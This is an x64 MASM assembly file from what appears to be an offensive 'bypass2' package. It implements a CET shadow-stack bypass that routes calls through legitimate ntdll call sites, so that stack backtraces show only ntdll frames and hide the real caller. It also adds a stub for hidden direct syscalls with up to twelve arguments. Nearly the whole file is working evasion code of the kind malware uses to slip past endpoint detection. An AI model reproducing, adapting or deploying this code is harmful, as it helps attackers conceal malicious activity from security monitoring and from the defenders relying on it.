; ---------------------------------------------------------------------------
; cet2_trampoline.asm
; x64 only. Assemble with ml64 (MASM). Part of the "bypass2" package.
;
; CET bypass #2 - "ntdll legal call site + PE continuation" chain.
;
; Unlike bypass #1 (which hides the caller by creating a fresh worker thread),
; bypass2 stays on the CALLING thread and never writes a fake return address:
;
;   caller  --real CALL-->  Cet2ChainEntry2 / Cet2ChainEntry3  (R pushed)
;     sub rsp, K1; jmp -> ntdll legal call site A (call rax)
;   ntdll call site A      --real CALL-->  Cet2Pe1 / Cet2PeA      (E1 pushed)
;   PE continuation        --jmp--> ntdll legal call site B (call rax)
;   ntdll call site B      --real CALL-->  target API / stub      (E2 pushed)
;   target                 --ret--> ntdll epilogue (add rsp,K; ret) (E2 popped)
;   ntdll epilogue         --ret--> ntdll epilogue of A            (E1 popped)
;   ntdll epilogue         --ret--> caller                         (R popped)
;
; Every RET pops the same value from the normal stack and from the hardware
; shadow stack, so the CET shadow stack and the normal stack stay perfectly
; synchronized and the ordinary stack backtrace == the CET backtrace.
; The PE continuation blocks are entered through REAL CALLs and only ever
; JMP onward (they never RET), so they never appear in either backtrace.
;
; No thread is created. No API is called. No code/data memory is modified:
; the return-address chain is produced exclusively by architectural CALL/RET.
; The only writes are (a) the call instruction's own return-address push and
; (b) transient argument slots on our own stack, exactly like a normal call.
;
; Request layout (must match cet2_common.h):
;   +0x00  void*  CallSite1          ; ntdll call site A (`call rax`)
;   +0x08  void*  CallSite2          ; ntdll call site B
;   +0x10  void*  CallSite3          ; 3-frame chain only
;   +0x18  void*  Target
;   +0x20  uint32 Ssn                 ; syscall stub path
;   +0x24  uint32 Pad
;   +0x28  uint64 A1  .. +0x80 A12
;   +0x88  uint32 K1                  ; epilogue fixup of CallSite1
;   +0x90  uint32 K2                  ; epilogue fixup of CallSite2
;   +0x98  uint32 K3                  ; epilogue fixup of CallSite3
;
; CET instruction encodings are emitted as raw bytes so older MASM versions
; build this file too:
;   endbr64          = F3 0F 1E FA
;   syscall          = 0F 05
; ---------------------------------------------------------------------------

OPTION CASEMAP:NONE

.code

; ---------------------------------------------------------------------------
; void Cet2ChainEntry2(void* request)
; 2-frame chain: caller -> ntdll call site A -> PE continuation -> ntdll call
; site B -> target. The caller's real CALL pushes R onto both stacks; the two
; ntdll call sites push E1/E2 onto both stacks; the epilogues pop them again.
; RCX = request pointer. R10 keeps the request pointer for the whole chain.
; ---------------------------------------------------------------------------
Cet2ChainEntry2 PROC
    db      0F3h, 0Fh, 1Eh, 0FAh        ; endbr64 (future IBT safety, NOP today)

    mov     r10, rcx                    ; request pointer -> R10 (survives)
    mov     eax, dword ptr [r10+88h]    ; K1 (epilogue fixup of call site A)
    sub     rsp, rax                    ; frame slot for call site A's epilogue
    mov     rax, OFFSET Cet2Pe1         ; first PE continuation (invisible)
    jmp     qword ptr [r10+00h]         ; -> ntdll call site A (`call rax`)
Cet2ChainEntry2 ENDP

; ---------------------------------------------------------------------------
; Cet2Pe1 - final PE continuation of the 2-frame chain.
; Entered through the REAL CALL inside ntdll call site A ([RSP] = E1).
; Adjusts RSP by K2, loads the target's arguments, then JMPs (never RETs)
; into ntdll call site B which really CALLs the target API.
; ---------------------------------------------------------------------------
Cet2Pe1 PROC
    db      0F3h, 0Fh, 1Eh, 0FAh        ; endbr64

    mov     eax, dword ptr [r10+90h]    ; K2 (epilogue fixup of call site B)
    sub     rsp, rax
    mov     rax, qword ptr [r10+18h]    ; Target
    mov     rdx, qword ptr [r10+30h]    ; A2
    mov     r8,  qword ptr [r10+38h]    ; A3
    mov     r9,  qword ptr [r10+40h]    ; A4
    mov     r11, qword ptr [r10+48h]    ; A5
    mov     qword ptr [rsp+20h], r11    ; A5 -> [target entry RSP + 0x28]
    mov     rcx, qword ptr [r10+28h]    ; A1
    jmp     qword ptr [r10+08h]         ; -> ntdll call site B (`call rax`)
Cet2Pe1 ENDP

; ---------------------------------------------------------------------------
; void Cet2ChainEntry3(void* request)
; 3-frame chain: adds one more ntdll call site + one more PE continuation so
; the fake backtrace contains three ntdll frames instead of two.
; ---------------------------------------------------------------------------
Cet2ChainEntry3 PROC
    db      0F3h, 0Fh, 1Eh, 0FAh        ; endbr64

    mov     r10, rcx
    mov     eax, dword ptr [r10+88h]    ; K1
    sub     rsp, rax
    mov     rax, OFFSET Cet2PeA         ; first PE continuation
    jmp     qword ptr [r10+00h]         ; -> ntdll call site A
Cet2ChainEntry3 ENDP

; ---------------------------------------------------------------------------
; Cet2PeA - intermediate PE continuation (3-frame chain).
; ---------------------------------------------------------------------------
Cet2PeA PROC
    db      0F3h, 0Fh, 1Eh, 0FAh        ; endbr64

    mov     eax, dword ptr [r10+90h]    ; K2
    sub     rsp, rax
    mov     rax, OFFSET Cet2PeB         ; next PE continuation (invisible)
    jmp     qword ptr [r10+08h]         ; -> ntdll call site B
Cet2PeA ENDP

; ---------------------------------------------------------------------------
; Cet2PeB - final PE continuation (3-frame chain).
; ---------------------------------------------------------------------------
Cet2PeB PROC
    db      0F3h, 0Fh, 1Eh, 0FAh        ; endbr64

    mov     eax, dword ptr [r10+98h]    ; K3
    sub     rsp, rax
    mov     rax, qword ptr [r10+18h]    ; Target
    mov     rdx, qword ptr [r10+30h]    ; A2
    mov     r8,  qword ptr [r10+38h]    ; A3
    mov     r9,  qword ptr [r10+40h]    ; A4
    mov     r11, qword ptr [r10+48h]    ; A5
    mov     qword ptr [rsp+20h], r11    ; A5 -> [target entry RSP + 0x28]
    mov     rcx, qword ptr [r10+28h]    ; A1
    jmp     qword ptr [r10+10h]         ; -> ntdll call site C
Cet2PeB ENDP

; ---------------------------------------------------------------------------
; Cet2SyscallStub - target for the hidden syscall path when more than 4
; arguments must be delivered (the kernel reads args 5..12 from the stack at
; the `syscall` instruction). The stub gives itself a private 0x70 frame, so
; the argument spill area (up to [RSP+0x60]) never touches the chain's return
; addresses, which live at [entry RSP] and above.
; R10 = request pointer at entry (preserved by the whole chain).
; ---------------------------------------------------------------------------
Cet2SyscallStub PROC
    db      0F3h, 0Fh, 1Eh, 0FAh        ; endbr64

    sub     rsp, 70h
    mov     rcx, qword ptr [r10+28h]    ; A1
    mov     rdx, qword ptr [r10+30h]    ; A2
    mov     r8,  qword ptr [r10+38h]    ; A3
    mov     r9,  qword ptr [r10+40h]    ; A4
    mov     r11, qword ptr [r10+20h]    ; SSN
    mov     rax, qword ptr [r10+48h]    ; A5
    mov     qword ptr [rsp+28h], rax
    mov     rax, qword ptr [r10+50h]    ; A6
    mov     qword ptr [rsp+30h], rax
    mov     rax, qword ptr [r10+58h]    ; A7
    mov     qword ptr [rsp+38h], rax
    mov     rax, qword ptr [r10+60h]    ; A8
    mov     qword ptr [rsp+40h], rax
    mov     rax, qword ptr [r10+68h]    ; A9
    mov     qword ptr [rsp+48h], rax
    mov     rax, qword ptr [r10+70h]    ; A10
    mov     qword ptr [rsp+50h], rax
    mov     rax, qword ptr [r10+78h]    ; A11
    mov     qword ptr [rsp+58h], rax
    mov     rax, qword ptr [r10+80h]    ; A12
    mov     qword ptr [rsp+60h], rax
    mov     eax, r11d                   ; SSN
    mov     r10, rcx                    ; syscall ABI: arg1 -> R10
    db      0Fh, 05h                    ; syscall
    add     rsp, 70h
    ret                                 ; pops the ntdll call site's E frame
Cet2SyscallStub ENDP

END
